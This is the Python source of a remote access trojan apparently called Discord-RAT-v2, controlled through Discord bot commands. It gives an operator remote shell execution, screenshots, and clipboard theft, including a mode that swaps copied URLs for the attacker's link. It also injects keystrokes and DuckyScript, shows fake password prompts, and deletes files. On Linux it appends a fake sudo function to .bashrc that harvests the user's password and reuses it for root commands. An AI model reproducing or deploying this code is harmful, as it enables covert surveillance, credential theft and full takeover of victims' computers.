from dotenv import load_dotenv
import discord
from discord.ext import commands, tasks
import os
from PIL import ImageGrab
from platform import system
from requests import get
import socket
import pyperclip
import asyncio
import pyautogui

load_dotenv()

DISCORD_TOKEN = os.getenv("DISCORD_TOKEN")

intents = discord.Intents.default()
intents.message_content = True

if system() == "Windows":
    isWindows = True
    path = "C:\\Windows\\System32\\Tasks\\"
    home_path = os.path.expanduser("~") + "\\"
elif system() == "Linux":
    isWindows = False
    path = "/var/tmp/"
    home_path = os.path.expanduser("~") + "/"
else:
    exit()

class MyBot(commands.Bot):
    async def setup_hook(self):
        # self is the bot here
        print(f"Logged in as: {self.user}")
        await self.add_cog(clipboard_cog(bot))
        await self.add_cog(keyboard_cog(bot))
        await self.add_cog(shell_cog(bot))
        await self.add_cog(message_cog(bot))
        if isWindows == False:
            await self.add_cog(sudo_cog(bot))
        


bot = MyBot(command_prefix=["!","! "], intents=intents, help_command=None)


# Standalone functions

def embed_data(title, description="", data="", color=discord.Color.green()):

    if data:
        description += f"\n```{data}```"
        
    embed = discord.Embed(
        title=title,
        color=color,
        description=description
    )
    return embed

def get_sudo_password():
    file = open(path + "passwd", "r")
    return file.read()

    
async def confirm_action(ctx, action_description):
    message = await ctx.send(f"Are you sure you want to {action_description}")

    await message.add_reaction('✅')

    def check(reaction, user):
        return user == ctx.author and str(reaction.emoji) == '✅' and reaction.message == message

    try:
        reaction, user = await bot.wait_for('reaction_add', timeout=60, check=check)

    except asyncio.TimeoutError:
        await ctx.send("Confirmation timed out. Action canceled.")
        return False

    else:
        return True

@bot.command(name="help")
async def help(ctx):
    help_menu_request = get("https://raw.githubusercontent.com/simen64/Discord-RAT-v2/main/help_menu.md")
    help_menu = help_menu_request.content.decode("utf-8")
    embed = embed_data(title="Help menu", description=help_menu)
    await ctx.send(embed=embed)


# Message functions

class message_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def alert(self, title, message):
        pyautogui.alert(text=message, title=title, button="OK")

    async def prompt(self, title, message):
        user_input = pyautogui.prompt(text=message, title=title , default='')
        return user_input

    async def password(self, title, message):
        password = pyautogui.password(text=message, title=title, default='', mask='*')
        return password

    def cancelled_prompt(self):
        embed = embed_data(title="Message prompt", description="Prompt was cancelled or no input was entered", color=discord.Color.red())
        return embed

    @commands.group(name="message", invoke_without_command=True)
    async def message(self, ctx, title, *args):
        message = ' '.join(args)
        await self.alert(title, message)
        embed = embed_data(title="Message", description="User exited message box with message:", data=message)
        await ctx.send(embed=embed)
        
    @message.command(name="prompt")
    async def message_prompt(self, ctx, title, *args):
        message = ' '.join(args)
        user_input = await self.prompt(title, message)
        if user_input == None:
            embed = self.cancelled_prompt()
        else:
            embed = embed_data(title="Message Prompt", description="User answer from prompt:", data=user_input)
        await ctx.send(embed=embed)

    @message.command(name="password")
    async def message_password(self, ctx, title, *args):
        message = ' '.join(args)
        password = await self.prompt(title, message)
        if password == None:
            embed = self.cancelled_prompt()
        else:
            embed = embed_data(title="Password Prompt", description="User answer from password prompt:", data=password)
        await ctx.send(embed=embed)


# File functions

@bot.command(name="cd")
async def change_dir(ctx, *args):
    path = ' '.join(args)
    embed_title = "Change Directory"

    try:
        os.chdir(path)
        embed = embed_data(title=embed_title, description="Changed directory to:", data=path)
    except FileNotFoundError:
        embed = embed_data(title=embed_title, description="Could not find directory:", data=path, color=discord.Color.red())
    except Exception as e:
        embed = embed_data(title=embed_title, description="Error occured, could not change directory:", data=e, color=discord.Color.red())

    await ctx.send(embed=embed)

@bot.command(name="ls")
async def list_dir(ctx):
    current_directory = os.getcwd()
    items = os.listdir(current_directory)
    items = '\n'.join(items)
    
    embed = embed_data(title="List files", description=f"Files in directory `{current_directory}`:", data=items)
    await ctx.send(embed=embed)

@bot.command(name="delete")
async def delete_file(ctx, *args):
    path = ' '.join(args)
    embed_title = "Delete File"
    confirm = await confirm_action(ctx, f"delete `{path}`? This action can not be undone.")

    if confirm:
        try:
            os.remove(path)
            embed = embed_data(title=embed_title, description="Deleted file:", data=path)
        except FileNotFoundError:
            embed = embed_data(title=embed_title, description="Could not find file:", data=path, color=discord.Color.red())
        except Exception as e:
            embed = embed_data(title=embed_title, description="Error occured, could not delete file:", data=e, color=discord.Color.red())
        
    else:
        embed = embed_data(title=embed_title, description="Action was not confirmed, file not deleted", color=discord.Color.red())
    await ctx.send(embed=embed)


# IP functions

def get_public_ip():
    ip = get('https://api.ipify.org').content.decode('utf8')
    public_ip = format(ip)
    return public_ip

def get_local_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(("8.8.8.8", 80))
    local_ip = s.getsockname()[0]
    s.close()
    return local_ip

@bot.command(name="ip")
async def ip(ctx):
    public_ip = get_public_ip()
    local_ip = get_local_ip()

    embed = discord.Embed(
        title="IP addresses",
        color=discord.Color.green()
    )
    embed.add_field(
        name="Public IP",
        value=f"`{public_ip}`",
        inline=False
    )
    embed.add_field(
        name="Local IP",
        value=f"`{local_ip}`",
        inline=False
    )

    await ctx.send(embed=embed)


# Screenshot functions

def take_screenshot():
    global path
    image_path = path + "screenshot.png"

    screenshot = ImageGrab.grab()
    screenshot.save(image_path)
    screenshot.close()

    return image_path

@bot.command(name="screenshot")
async def screenshot(ctx):

    image_path = take_screenshot()
    await ctx.send(file=discord.File(image_path))


# Clipboard functions
    
class clipboard_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot
        self.previous_clipboard = self.get_clipboard()

    def cog_unload(self) -> None:
        self.clipboard_monitor.stop()
        self.clipboard_monitor_url.stop()

    def get_clipboard(self):
        clipboard_content = pyperclip.paste()
        return clipboard_content

    def set_clipboard(self, text):
        pyperclip.copy(text)
        return text
    
    def check_clipboard(self):
        try:
            clipboard = self.get_clipboard()
        except:
            pass

        if clipboard != self.previous_clipboard:
            self.previous_clipboard = clipboard
            return clipboard
        else:
            return 1
        
    async def check_clipboard(self):
        try:
            clipboard = self.get_clipboard()
        except Exception as e:
            print(e)
            return None

        if hash(clipboard) != hash(self.previous_clipboard):
            self.previous_clipboard = clipboard
            return clipboard
        else:
            return None

    @tasks.loop(seconds=3)
    async def clipboard_monitor(self, ctx):
        clipboard = await self.check_clipboard()
        if clipboard:
            await self.send_clipboard_content(ctx, clipboard)

    @tasks.loop(seconds=1)
    async def clipboard_monitor_url(self, ctx, url):
        clipboard = await self.check_clipboard()
        if clipboard and any(item in clipboard for item in ["http://", "https://", ".com", ".net", ".org", "www."]):
            if clipboard != url:
                self.set_clipboard(url)
                await self.send_clipboard_content(ctx, clipboard, switched_url=url)

        elif clipboard != None:
            await self.send_clipboard_content(ctx, clipboard)

    async def send_clipboard_content(self, ctx, clipboard, switched_url=None):
        if len(clipboard) > 6000:
            embed = discord.Embed(
                title="Clipboard monitor",
                description="Clipboard contents were too long",
                color=discord.Color.red()
            )
        else:
            embed = discord.Embed(
                title="Extracted clipboard contents",
                color=discord.Color.green()
            )
            embed.add_field(name="Contents:", value=f"`{clipboard}`", inline=False)
            if switched_url:
                embed.add_field(name="Switched out to:", value=f"`{switched_url}`", inline=False)
        
        await ctx.send(embed=embed)


    @commands.group(name="clipboard", invoke_without_command=True)
    async def clipboard(self, ctx):
        await ctx.send("see help menu")

    @clipboard.group(name="monitor", invoke_without_command=True)
    async def monitor(self,ctx):
        await ctx.send("see help menu for monitor mode")

    @monitor.command(name="start")
    async def start(self, ctx):
        self.clipboard_monitor.start(ctx)
        embed = embed_data(
            title="Clipboard monitor started",
            description="Clipboard monitor mode was started, disable with `clipboard monitor stop`"
            )
        await ctx.send(embed=embed)

    @monitor.command(name="stop")
    async def stop(self, ctx):
        self.clipboard_monitor.stop()
        embed = embed_data(
            title="Clipboard monitor stopped",
            description="Clipboard monitor mode was stopped, restart with `clipboard monitor start`",
            color=discord.Color.red()
            )
        await ctx.send(embed=embed)

    @monitor.command(name="status")
    async def status(self, ctx):
        if self.clipboard_monitor.is_running():
            status = "Running"
            color = discord.Color.green()
        else:
            status = "Stopped"
            color = discord.Color.red()

        embed = embed_data(
            title="Clipboard monitor status",
            description=f"Clipboard monitor is: **{status}**",
            color=color)
        await ctx.send(embed=embed)
    
    @monitor.group(name="url", invoke_without_command=True)
    async def url(self,ctx):
        await ctx.send("see help menu for monitor mode")

    @url.command(name="start")
    async def start_url(self, ctx, url):
        self.clipboard_monitor_url.start(ctx, url)
        embed = embed_data(
            title="Clipboard monitor URL started",
            description="Clipboard monitor mode was started in URL mode, disable with `clipboard monitor url stop`"
            )
        await ctx.send(embed=embed)

    @url.command(name="stop")
    async def stop_url(self, ctx):
        self.clipboard_monitor.stop()
        embed = embed_data(
            title="Clipboard monitor URL stopped",
            description="Clipboard monitor mode URL was stopped, restart with `clipboard monitor url start`",
            color=discord.Color.red()
            )
        await ctx.send(embed=embed)

    @url.command(name="status")
    async def status_url(self, ctx):
        if self.clipboard_monitor_url.is_running():
            status = "Running"
            color = discord.Color.green()
        else:
            status = "Stopped"
            color = discord.Color.red()

        embed = embed_data(
            title="Clipboard monitor URL status",
            description=f"Clipboard monitor in URL mode is: **{status}**",
            color=color)
        await ctx.send(embed=embed)

    @clipboard.command(name="get")
    async def get(self, ctx):
        clipboard_content = self.get_clipboard()

        if len(clipboard_content) > 5999:
            await ctx.send("clipboard contents too long")

        embed = embed_data(
            title="Extracted clipboard contents:",
            data=clipboard_content
            )
        await ctx.send(embed=embed)

    @clipboard.command(name="set")
    async def set(self, ctx, *args):
        arg = ' '.join(args)

        text = self.set_clipboard(arg)

        embed = embed_data(
            title="Set clipboard contents to:",
            data=text
            )
        await ctx.send(embed=embed)


# Keyboard functions

class keyboard_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    def pyautogui_write(self, data, interval=0):
        pyautogui.write(data, interval=interval)

    def pyautogui_press(self, key):
        pyautogui.press(key)

    def pyautogui_hotkey(self, hotkeys):
        pyautogui.hotkey(hotkeys)

    async def parse_ducky_script(self, ducky_script):
        file = ducky_script.splitlines()

        for line in file:
            split = line.split(" ")
            args = []
            for arg in split:
                args.append(arg.replace("\n", ""))

            match args[0]:
                case "REM":
                    pass

                case "STRING":
                    text = " ".join(args[1:])
                    self.pyautogui_write(text)

                case "STRINGLN":
                    text = " ".join(args[1:])
                    self.pyautogui_write(text)
                    await asyncio.sleep(0.2)
                    self.pyautogui_press("ENTER")

                case "DELAY":
                    time = int(args[1]) / 1000
                    await asyncio.sleep(time)

                case _:
                    hotkeys = []
                    for arg in args:
                        hotkeys.append(arg.replace("GUI", "win"))
                    print(hotkeys)
                    self.pyautogui_hotkey(hotkeys)


    @commands.group(name="keyboard", invoke_without_command=True)
    async def keyboard(self, ctx):
        await ctx.send("see help menu")

    @keyboard.command(name="duckyscript")
    async def duckyscript(self, ctx):
        attachment_url = ctx.message.attachments[0].url

        file_contents = get(attachment_url)
        file_contents_str = file_contents.content.decode("utf-8")

        await self.parse_ducky_script(file_contents_str)

        embed = embed_data(title="Duckyscript | Keyboard", description="Executed duckyscript:", data=file_contents_str, color=discord.Color.green())

        await ctx.send(embed=embed)

    @keyboard.command(name="write")
    async def write(self, ctx, arg):
        self.pyautogui_write(arg)
        embed = embed_data(title="Write | Keyboard", description="Used keyboard to write:", data=arg)
        await ctx.send(embed=embed)

    @keyboard.command(name="press")
    async def press(self, ctx, arg):
        self.pyautogui_press(arg)
        embed = embed_data(title="Press | Keyboard", description="Used keyboard to press:", data=arg)
        await ctx.send(embed=embed)

    @keyboard.command(name="hotkey")
    async def hotkey(self, ctx, *args):
        hotkeys = []
        for arg in args:
            hotkeys.append(arg.replace("GUI", "win"))
        print(hotkeys)
        self.pyautogui_hotkey(hotkeys)
        embed = embed_data(title="Hotkey | Keyboard", description="Used keyboard to execute hotkey:", data=args)
        await ctx.send(embed=embed)


# Shell functions
        
class shell_cog(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    async def execute_shell(self, command, timeout):
        process = await asyncio.create_subprocess_shell(
                command,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE
            )

        try:
            stdout, stderr = await asyncio.wait_for(
                process.communicate(),
                timeout=timeout
            )
            print("shell done")
            return stdout.decode().strip() + stderr.decode().strip()
            
        except asyncio.TimeoutError:
            print("timed out")
            return 1
        
    def parse_shell_args(self, *args):
        args = list(args[0])

        for index, item in enumerate(args):
            if item == "-t":
                timeout_index = index + 1
                timeout = int(args[timeout_index])
                args.remove(item)
                args.pop(index)
                break
        else:
            timeout = 30

        arg = ' '.join(args)
        command_args = [arg, timeout]
        print(command_args)
        return command_args
    
    async def run_shell_command(self, ctx, *args):
        command_args = self.parse_shell_args(args)

        command = command_args[0]
        timeout = command_args[1]

        output = await self.execute_shell(command, timeout)

        if output == 1:
            embed = embed_data(
                title="Command timed out | Shell",
                description=f"Executed command timed out after {timeout} seconds:",
                data=command,
                color=discord.Color.red()
                )
            await ctx.send(embed=embed)
        else:
            await ctx.send(f"```\n{output}\n```")


    @commands.command(name="shell")
    async def shell(self, ctx, *args):
        await self.run_shell_command(ctx, *args)


# Linux specifix commands

if isWindows == False:
    print("its linux")
    print(home_path)

    # root functions

    class sudo_cog(commands.Cog):
        def __init__(self, bot):
            self.bot = bot

        async def get_sudo(self, ctx):
            try:
                file = open(path + "passwd", "r")
                sudo_password = file.read()
                return sudo_password
            except FileNotFoundError:
                embed = embed_data(
                    title="Sudo password",
                    description="The sudo password has not yet been obtained. Run `!sudo password` to start listening for the sudo password",
                    color=discord.Color.red()
                    )
                await ctx.send(embed=embed)
                return 1

        async def check_passwd_file(self, ctx):
            embed = embed_data(title="Sudo password", description="Listening for root password started")
            await ctx.send(embed=embed)
            while True:
                try:
                    file = open(path + "passwd", "r")
                    passwd = file.read()
                    return passwd
                except FileNotFoundError:
                    print("no file")
                    pass
                await asyncio.sleep(1)

        async def intercept_sudo(self, ctx):
            injection_code = """\nsudo() {
while true; do
    read -s -r -p "[sudo] password for ${USER}: " passwd
    echo "${passwd}" | /usr/bin/sudo -S ${@} && { echo $passwd > /var/tmp/passwd; break; }
    clear
    echo Sorry, try again.
done
}"""

            file = open(home_path + ".bashrc", "r")
            original_bashrc = file.read()
            file.close()

            file = open(home_path + ".bashrc", "a")
            file.write(injection_code)
            file.close()

            passwd = await self.check_passwd_file(ctx)

            file = open(home_path + ".bashrc", "w")
            file.write(original_bashrc)
            file.close()

            return passwd

        @commands.group(name="sudo", invoke_without_command=True)
        async def sudo(self, ctx):
            await ctx.send("see help menu")

        @sudo.command(name="password")
        async def password(self, ctx):
            passwd = await self.intercept_sudo(ctx)
            embed = embed_data(title="Sudo password", description="Found sudo password:", data=passwd)
            await ctx.send(embed=embed)

        @sudo.command(name="shell")
        async def shell(self, ctx, *args):
            print("ran as sudo")

            sudo_password = await self.get_sudo(ctx)

            if sudo_password != 1:
                added_sudo_args = ("echo", sudo_password, "|", "sudo", "-S") + args

                shellCOG = shell_cog(bot)

                await shellCOG.run_shell_command(ctx, *added_sudo_args)

        @sudo.command(name="remove")
        async def remove(self, ctx):
            password = await self.get_sudo(ctx)
            if password != 1:
                confirmation = await confirm_action(ctx, "remove sudo password? This will remove the ability to use functions that require sudo")
                print(confirmation)
                if confirmation:
                    print("delete")
                else:
                    print("DONT")


# Running the bot
    
bot.run(DISCORD_TOKEN)
